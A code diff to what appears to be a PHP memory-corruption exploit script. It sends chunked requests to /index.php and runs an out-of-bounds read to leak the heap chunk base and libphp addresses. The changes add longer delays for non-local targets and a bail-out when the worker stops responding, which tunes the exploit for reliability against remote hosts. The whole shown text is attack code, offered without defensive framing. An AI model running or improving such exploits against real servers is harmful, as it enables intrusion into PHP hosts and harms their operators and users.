@@ -267,7 +267,8 @@ def _run_attempt(args, holders, profile, attempt, tmp) -> int:
                     "--out", a1, "--big", "78"], check=True,
                    stdout=subprocess.DEVNULL)
     send_chunked(args.host, args.port, "/index.php" + Q, a1, 180)
-    time.sleep(0.2)
+    remote = args.host not in ("127.0.0.1", "localhost", "::1")
+    time.sleep(2.0 if remote else 0.2)
 
     print("[try %d] B1: stale-id OOB read (chunk base + libphp)" % attempt)
     info = None
@@ -284,6 +285,9 @@ def _run_attempt(args, holders, profile, attempt, tmp) -> int:
             leak_info = parse_leak(resp, profile)
         except Exception as exc:
             print("      spec %d/%d miss: %r" % (si + 1, len(LEAK_SPECS), exc))
+            if "(0 bytes)" in str(exc) or isinstance(exc, subprocess.CalledProcessError):
+                print("      worker unresponsive, skipping remaining specs")
+                break
             continue
         cand = leak_info["main_candidates"]
         if not cand:
